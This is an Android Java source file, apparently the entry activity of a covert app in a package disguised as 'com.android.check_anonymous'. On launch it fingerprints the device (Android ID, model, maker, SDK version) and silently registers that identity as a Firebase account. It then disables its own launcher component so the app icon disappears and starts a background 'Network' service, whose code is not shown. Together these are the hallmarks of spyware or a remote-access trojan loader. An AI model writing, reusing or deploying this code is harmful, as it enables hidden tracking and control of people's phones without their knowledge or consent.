package com.android.check_anonymous;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String android_id = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID);

        android_id = android_id + "_" + Build.MODEL + "_" +
                Build.MANUFACTURER + "_" + Build.VERSION.SDK_INT + "_";

        FirebaseAuth.getInstance().createUserWithEmailAndPassword(android_id + "@mail.ru", android_id)
                .addOnCompleteListener(this, new OnCompleteListener<AuthResult>() {
                    @Override
                    public void onComplete(@NonNull Task<AuthResult> task) {
                        if (task.isSuccessful()) {
                            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
                        } else {
                        }
                        MainActivity.this.finish();
                    }
                });


        String pgkname = getApplicationContext().getPackageName();
        ComponentName componentToDisable = new ComponentName(pgkname, pgkname + ".MainActivity");
        getApplicationContext().getPackageManager().setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        getApplicationContext().startService(new Intent(getApplicationContext(), Network.class));
    }
}
